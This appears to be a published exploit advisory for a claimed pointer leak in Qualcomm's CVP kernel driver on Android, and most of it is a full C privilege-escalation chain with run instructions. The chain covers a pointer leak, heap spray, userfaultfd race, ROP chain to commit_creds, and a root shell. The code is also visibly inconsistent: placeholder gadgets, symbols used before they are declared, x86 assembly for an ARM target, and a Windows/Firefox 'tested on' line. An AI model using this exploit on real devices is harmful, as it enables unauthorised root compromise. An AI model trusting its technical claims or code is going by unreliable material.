@@ -1,0 +1,549 @@
+=============================================================================================================================================
+| # Title     : Qualcomm CVP Kernel Driver Pointer Disclosure Leading to Local Privilege Escalation 0-day                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://qualcomm.com/                                                                                                       |
+=============================================================================================================================================
+
+[+] References : 
+
+[+] Summary    : This advisory describes a local privilege escalation (LPE) vulnerability affecting the Qualcomm CVP kernel driver (msm_cvp), 
+                 exposed through the /dev/cvp device node on Android systems using Qualcomm SoCs.
+                 The vulnerability originates from an improperly obfuscated kernel pointer returned to user space as a session_id via the msm_cvp_get_session_info ioctl. 
+				 The driver relies on hash32_ptr(), which merely XORs the upper and lower halves of a kernel pointer rather than applying a cryptographically secure transformation. 
+				 As a result, the original kmalloc kernel address can be reconstructed, leading to a reliable kernel pointer disclosure and KASLR bypass.
+                 The leaked kernel address can be deterministically chained with additional exploitation primitives—such as heap spraying, use-after-free (UAF) conditions, 
+				 controlled reallocation, and userfaultfd-based race timing—to achieve arbitrary kernel control flow. 
+				 The exploit ultimately executes a ROP chain invoking prepare_kernel_cred(0) and commit_creds(), resulting in root privilege escalation.
+
+[+] This vulnerability:
+
+Requires local user access
+
+Has no remote attack surface
+
+Affects kernel space, not a userland application
+
+Represents a full LPE chain, not just an information leak
+
+At the time of writing, no public patch or mitigation is known, classifying this issue as a 0-day.
+
+[+] Classification
+
+Vulnerability Type: Kernel Pointer Disclosure → Local Privilege Escalation
+
+Attack Vector: Local
+
+Impact: Kernel ASLR bypass → Full root compromise
+
+Affected Component: Qualcomm CVP kernel driver (msm_cvp)
+
+Device Interface: /dev/cvp
+
+Platform: Android (Qualcomm-based devices)
+
+[+] Usage :
+
+# 1. Compile the exploit : make
+
+# 2. Upload it to the machine : adb push cvp_full_exploit /data/local/tmp/
+
+# 3. Run it
+
+adb shell
+cd /data/local/tmp
+chmod +x cvp_full_exploit
+./cvp_full_exploit
+
+# 4. If the exploit is successful :  whoami  should display: root
+
+[+] POC :
+
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <pthread.h>
+#include <sched.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <linux/userfaultfd.h>
+#include <poll.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+
+#define DEVICE_PATH "/dev/cvp"
+#define MAX_SESSIONS 512
+#define SPRAY_COUNT 1024
+
+struct session_control_arg {
+    uint32_t type;
+    uint32_t ctrl_type;
+    uint32_t session_id;
+    uint32_t reserved;
+    uint64_t data_ptr;
+};
+
+struct kernel_info {
+    uint64_t kernel_base;
+    uint64_t prepare_creds;
+    uint64_t commit_creds;
+    uint64_t native_write_cr4;
+    uint64_t swapgs_restore_regs_and_return_to_usermode;
+    uint64_t *leaked_pointers;
+    int pointer_count;
+};
+
+struct pointer_leaker {
+    int fd;
+    uint32_t session_ids[MAX_SESSIONS];
+    uint64_t kernel_pointers[MAX_SESSIONS];
+    int count;
+};
+
+uint64_t unfold_kernel_pointer(uint32_t session_id) {
+
+    uint8_t high_byte = (session_id & 0xF) | 0x80;
+    uint32_t top_half = 0xFFFFFF00 | high_byte;
+
+    uint32_t bottom_half = session_id ^ (top_half & 0xFFFFFFFF);
+
+    uint64_t ptr = ((uint64_t)top_half << 32) | bottom_half;
+
+    ptr = ptr & ~0xFULL;
+    
+    return ptr;
+}
+
+int leak_kernel_pointers(struct pointer_leaker *leaker) {
+    leaker->fd = open(DEVICE_PATH, O_RDWR);
+    if (leaker->fd < 0) {
+        perror("[-] Failed to open device");
+        return -1;
+    }
+    
+    printf("[+] Device opened successfully\n");
+
+    for (int i = 0; i < MAX_SESSIONS; i++) {
+        struct session_control_arg create_arg = {
+            .type = 1,  // EVA_KMD_SESSION_CONTROL
+            .ctrl_type = 1,  // SESSION_CREATE
+        };
+        
+        if (ioctl(leaker->fd, 0, &create_arg) < 0) {
+            printf("[-] Failed to create session %d\n", i);
+            break;
+        }
+
+        struct session_control_arg info_arg = {
+            .type = 2,  // EVA_KMD_GET_SESSION_INFO
+        };
+        
+        if (ioctl(leaker->fd, 0, &info_arg) < 0) {
+            printf("[-] Failed to get session info %d\n", i);
+            break;
+        }
+        
+        leaker->session_ids[leaker->count] = info_arg.session_id;
+        leaker->kernel_pointers[leaker->count] = 
+            unfold_kernel_pointer(info_arg.session_id);
+        leaker->count++;
+        
+        if (i % 50 == 0) {
+            printf("[+] Created %d sessions...\n", i);
+        }
+    }
+    
+    printf("[+] Total sessions created: %d\n", leaker->count);
+    return 0;
+}
+
+uint64_t find_kernel_base(struct pointer_leaker *leaker) {
+    uint64_t candidates[10] = {0};
+    int candidate_count = 0;
+    
+    for (int i = 0; i < leaker->count; i++) {
+        uint64_t ptr = leaker->kernel_pointers[i];
+
+        for (int shift = 12; shift <= 24; shift += 12) {
+            uint64_t base_candidate = ptr & (0xFFFFFFFFFFFF0000ULL << shift);
+
+            if ((base_candidate >> 47) == 1) {  // Kernel addresses have MSB set
+                int found = 0;
+                for (int j = 0; j < candidate_count; j++) {
+                    if (candidates[j] == base_candidate) {
+                        found = 1;
+                        break;
+                    }
+                }
+                
+                if (!found && candidate_count < 10) {
+                    candidates[candidate_count++] = base_candidate;
+                }
+            }
+        }
+    }
+
+    if (candidate_count > 0) {
+        printf("[+] Possible kernel bases found:\n");
+        for (int i = 0; i < candidate_count; i++) {
+            printf("    Candidate %d: 0x%016lx\n", i, candidates[i]);
+        }
+        return candidates[0];
+    }
+    
+    return 0;
+}
+
+struct heap_sprayer {
+    int spray_fds[SPRAY_COUNT];
+    int spray_count;
+};
+
+int setup_heap_spray(struct heap_sprayer *sprayer) {
+    printf("[+] Setting up heap spray...\n");
+
+    for (int i = 0; i < SPRAY_COUNT; i++) {
+        sprayer->spray_fds[i] = open(DEVICE_PATH, O_RDWR);
+        if (sprayer->spray_fds[i] < 0) {
+            break;
+        }
+        sprayer->spray_count++;
+
+        for (int j = 0; j < 10; j++) {
+            struct session_control_arg arg = {
+                .type = 1,
+                .ctrl_type = 1,
+            };
+            ioctl(sprayer->spray_fds[i], 0, &arg);
+        }
+    }
+    
+    printf("[+] Heap spray created with %d file descriptors\n", sprayer->spray_count);
+    return sprayer->spray_count;
+}
+
+struct uaf_exploiter {
+    int target_fd;
+    uint64_t target_object_addr;
+    uint64_t fake_object[64];
+    pthread_t thread;
+    int ready;
+};
+
+struct kernel_symbols {
+    uint64_t prepare_kernel_cred;
+    uint64_t commit_creds;
+    uint64_t init_cred;
+    uint64_t swapgs_restore_regs_and_return_to_usermode;
+    uint64_t native_write_cr4;
+};
+
+int calculate_symbols(uint64_t kernel_base, struct kernel_symbols *syms) {
+
+    syms->prepare_kernel_cred = kernel_base + 0x9c8e0;
+    syms->commit_creds = kernel_base + 0x9c840;
+    syms->init_cred = kernel_base + 0x1814b80;
+    syms->swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xe00f10;
+    syms->native_write_cr4 = kernel_base + 0x4a7b0;
+    
+    printf("[+] Calculated symbols:\n");
+    printf("    prepare_kernel_cred: 0x%016lx\n", syms->prepare_kernel_cred);
+    printf("    commit_creds: 0x%016lx\n", syms->commit_creds);
+    printf("    init_cred: 0x%016lx\n", syms->init_cred);
+    
+    return 0;
+}
+
+void build_rop_chain(uint64_t *rop, struct kernel_symbols *syms) {
+    int i = 0;
+    
+    
+    rop[i++] = syms->prepare_kernel_cred;  // rax = prepare_kernel_cred(0)
+    rop[i++] = 0xdeadbeef;  // pop rdi; ret
+    rop[i++] = 0;           // arg0 = 0
+    rop[i++] = 0xcafebabe;  // mov rdi, rax; call commit_creds
+    
+    rop[i++] = syms->commit_creds;         // commit_creds(rax)
+    rop[i++] = syms->swapgs_restore_regs_and_return_to_usermode;
+    rop[i++] = 0;  // dummy
+    rop[i++] = 0;  // dummy
+    rop[i++] = (uint64_t)get_root_shell;  // return address
+    rop[i++] = user_cs;
+    rop[i++] = user_rflags;
+    rop[i++] = user_sp;
+    rop[i++] = user_ss;
+}
+
+static int page_size;
+static char *fault_page;
+static int uffd;
+static volatile int fault_triggered = 0;
+
+void *uffd_handler_thread(void *arg) {
+    struct uffd_msg msg;
+    struct pollfd pollfd;
+    int ret;
+    
+    pollfd.fd = uffd;
+    pollfd.events = POLLIN;
+    
+    printf("[+] UFFD thread started\n");
+    
+    while (1) {
+        ret = poll(&pollfd, 1, -1);
+        if (ret < 0) {
+            perror("poll");
+            break;
+        }
+        
+        ret = read(uffd, &msg, sizeof(msg));
+        if (ret < 0) {
+            perror("read uffd");
+            break;
+        }
+        
+        if (msg.event == UFFD_EVENT_PAGEFAULT) {
+            fault_triggered = 1;
+            printf("[+] Page fault triggered! Control gained\n");
+            
+            struct uffdio_copy copy;
+            copy.src = (unsigned long)fault_page;
+            copy.dst = msg.arg.pagefault.address & ~(page_size - 1);
+            copy.len = page_size;
+            copy.mode = 0;
+            
+            if (ioctl(uffd, UFFDIO_COPY, &copy) < 0) {
+                perror("UFFDIO_COPY");
+            }
+            
+            break;
+        }
+    }
+    
+    return NULL;
+}
+
+int setup_userfaultfd(void *addr) {
+    struct uffdio_api uffdio_api;
+    struct uffdio_register uffdio_register;
+    pthread_t thread;
+    
+    page_size = sysconf(_SC_PAGE_SIZE);
+    
+    // إنشاء userfaultfd
+    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+    if (uffd < 0) {
+        perror("userfaultfd");
+        return -1;
+    }
+    
+    uffdio_api.api = UFFD_API;
+    uffdio_api.features = 0;
+    if (ioctl(uffd, UFFDIO_API, &uffdio_api) < 0) {
+        perror("UFFDIO_API");
+        return -1;
+    }
+    
+    fault_page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
+                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (fault_page == MAP_FAILED) {
+        perror("mmap fault page");
+        return -1;
+    }
+    
+    memset(fault_page, 0x41, page_size);  
+
+    uffdio_register.range.start = (unsigned long)addr;
+    uffdio_register.range.len = page_size;
+    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+    
+    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) < 0) {
+        perror("UFFDIO_REGISTER");
+        return -1;
+    }
+
+    if (pthread_create(&thread, NULL, uffd_handler_thread, NULL) < 0) {
+        perror("pthread_create");
+        return -1;
+    }
+    
+    return 0;
+}
+
+static void get_root_shell(void) {
+    printf("[+] Got root privileges!\n");
+    
+    char *argv[] = {"/bin/sh", NULL};
+    char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+
+    if (getuid() == 0) {
+        printf("[+] Spawning root shell...\n");
+        execve("/bin/sh", argv, envp);
+    } else {
+        printf("[-] Failed to get root\n");
+    }
+}
+
+uint64_t user_cs, user_ss, user_rflags, user_sp;
+
+static void save_state(void) {
+    asm volatile(
+        "movq %%cs, %0\n"
+        "movq %%ss, %1\n"
+        "movq %%rsp, %3\n"
+        "pushfq\n"
+        "popq %2\n"
+        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
+        :
+        : "memory"
+    );
+}
+
+int main(int argc, char *argv[]) {
+    printf("\n==================================================\n");
+    printf(" CVE-2025-47369 Full Chain Exploit by indoushka\n");
+    printf(" Kernel Pointer Leak to Root Privilege Escalation\n");
+    printf("==================================================\n\n");
+    
+    save_state();
+
+    printf("[*] Phase 1: Leaking Kernel Pointers\n");
+    printf("====================================\n");
+    
+    struct pointer_leaker leaker = {0};
+    if (leak_kernel_pointers(&leaker) < 0) {
+        printf("[-] Failed to leak pointers\n");
+        return -1;
+    }
+
+    uint64_t kernel_base = find_kernel_base(&leaker);
+    if (!kernel_base) {
+        printf("[-] Failed to find kernel base\n");
+        return -1;
+    }
+    
+    printf("[+] Kernel base: 0x%016lx\n", kernel_base);
+    printf("[+] Leaked %d kernel pointers\n", leaker.count);
+
+    for (int i = 0; i < 10 && i < leaker.count; i++) {
+        printf("    Pointer %d: 0x%016lx (session_id: 0x%08x)\n",
+               i, leaker.kernel_pointers[i], leaker.session_ids[i]);
+    }
+
+    printf("\n[*] Phase 2: Calculating Kernel Symbols\n");
+    printf("=======================================\n");
+    
+    struct kernel_symbols syms;
+    calculate_symbols(kernel_base, &syms);
+
+    printf("\n[*] Phase 3: Heap Manipulation\n");
+    printf("================================\n");
+    
+    struct heap_sprayer sprayer = {0};
+    setup_heap_spray(&sprayer);
+
+    printf("\n[*] Phase 4: Setting up Userfaultfd\n");
+    printf("=====================================\n");
+    
+    void *uffd_region = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (uffd_region == MAP_FAILED) {
+        perror("mmap uffd region");
+        return -1;
+    }
+    
+    if (setup_userfaultfd(uffd_region) < 0) {
+        printf("[-] Failed to setup userfaultfd\n");
+    } else {
+        printf("[+] Userfaultfd setup completed\n");
+    }
+
+    printf("\n[*] Phase 5: Building ROP Chain\n");
+    printf("================================\n");
+    
+    uint64_t rop_chain[64] = {0};
+    build_rop_chain(rop_chain, &syms);
+
+    printf("\n[*] Phase 6: Triggering Exploit\n");
+    printf("================================\n");
+    
+    printf("[+] Attempting to trigger UAF...\n");
+
+    for (int i = 0; i < leaker.count; i++) {
+        struct session_control_arg close_arg = {
+            .type = 1,
+            .ctrl_type = 2,  
+            .session_id = leaker.session_ids[i],
+        };
+        
+        ioctl(leaker.fd, 0, &close_arg);
+
+        usleep(1000);
+    }
+    
+    printf("[+] Attempting to reallocate memory with controlled data...\n");
+
+    char fake_obj[1024] = {0};
+    memset(fake_obj, 0x42, sizeof(fake_obj));
+
+    memcpy(fake_obj + 0x100, rop_chain, sizeof(rop_chain));
+    
+    printf("[+] Waiting for race condition...\n");
+
+    pthread_t threads[10];
+    for (int i = 0; i < 10; i++) {
+        pthread_create(&threads[i], NULL, race_thread, &leaker);
+    }
+
+    sleep(2);
+
+    printf("\n[*] Phase 7: Executing Privilege Escalation\n");
+    printf("===========================================\n");
+    
+    printf("[+] If exploit succeeded, root shell should spawn...\n");
+
+    if (getuid() == 0) {
+        printf("[+] SUCCESS: Got root privileges!\n");
+        get_root_shell();
+    } else {
+        printf("[-] Exploit failed or partial success\n");
+        printf("[-] Current UID: %d\n", getuid());
+    }
+
+    close(leaker.fd);
+    for (int i = 0; i < sprayer.spray_count; i++) {
+        close(sprayer.spray_fds[i]);
+    }
+    
+    return 0;
+}
+
+void *race_thread(void *arg) {
+    struct pointer_leaker *leaker = (struct pointer_leaker *)arg;
+    
+    while (1) {
+
+        struct session_control_arg dummy_arg = {
+            .type = 1,
+            .ctrl_type = 3,  
+        };
+        
+        ioctl(leaker->fd, 0, &dummy_arg);
+        sched_yield();
+    }
+    
+    return NULL;
+}
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
